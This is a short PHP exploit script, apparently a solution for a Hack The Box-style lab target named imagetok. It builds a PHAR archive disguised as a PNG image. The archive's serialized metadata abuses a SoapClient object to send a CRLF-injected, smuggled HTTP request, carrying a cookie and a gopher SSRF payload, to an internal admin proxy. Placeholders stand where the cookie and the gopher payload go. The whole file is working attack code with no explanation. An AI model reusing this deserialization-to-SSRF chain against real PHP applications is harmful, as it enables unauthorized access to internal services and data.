<?php
/*
Coded by d4rkstat1c
*/
  class ImageModel {
      public $file;
      public function __construct($file) {
          $this->file = $file;
      }

      public function __destruct()
      {
          $this->file->getFileName();
      }
  }

  $cookie = '<auth_bypass_cookie>;';
  $gopher_payload = '<gopher:///...."';
  $post_data = 'url=' . urlencode($gopher_payload);

  $localhost = 'http://127.0.0.1';
  $CRLF = "\r\n";
  $smug_headers = [
      'POST /proxy HTTP/1.1',
      'Host: admin.imagetok.htb',
      'Connection: Close',
      'Content-Type: application/x-www-form-urlencoded',
      'Cookie: PHPSESSID=' . $cookie,
      'Content-Length: ' . (string)strlen($post_data)
      ];

  $crlf_inject_str = $CRLF . 
      'Content-Length: 0' .
      str_repeat($CRLF, 2);

  $smug_headers_str = join($CRLF, $smug_headers) .
      str_repeat($CRLF, 2);

  $ssrf_payload =
       $crlf_inject_str .
       $smug_headers_str .
       $post_data;

  echo $ssrf_payload . "\n";

  $object = new ImageModel(new SoapClient(null, array(
          'uri' => 'bbb',
          'location' => $localhost,
          'user_agent' => 'xxx' . $ssrf_payload,
      )));

  $a = fread(fopen("image.png", "rb"), filesize("image.png"));
  $phar = new Phar('exploit.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'test');
  $phar->setStub($a . ' __HALT_COMPILER(); ? >');
  $phar->setMetadata($object);
  $phar->stopBuffering();
  rename('exploit.phar', 'exploit.png');

  echo serialize($object) . "\n";
?>
